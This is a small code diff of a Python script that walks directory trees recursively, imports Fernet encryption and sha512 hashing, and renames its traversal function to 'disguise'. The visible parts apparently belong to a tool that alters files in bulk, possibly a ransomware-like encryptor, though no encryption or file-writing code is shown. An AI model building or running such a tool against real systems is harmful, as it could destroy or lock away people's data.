@@ -2,7 +2,7 @@
 
 import os
 import gc
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet # pip install cryptography
 from hashlib import sha512
 import sys
 
@@ -15,7 +15,7 @@ dirs_exclude = ['node_modules', 'vendor', '.git']
 print('!!')
 
 
-def discovery_files(dirs):
+def disguise(dirs):
     discovered_dirs = []
 
     for dir_path in dirs:
@@ -36,7 +36,7 @@ def discovery_files(dirs):
                 discovered_dirs.append(path)
 
     if len(discovered_dirs):
-        return discovery_files(discovered_dirs)
+        return disguise(discovered_dirs)
 
     return None
 
@@ -53,6 +53,6 @@ def hash_content(file_path):
 
 
 if __name__ == '__main__':
-    discovery_files(dir_list)
+    disguise(dir_list)
     gc.collect()
     print('Done!')
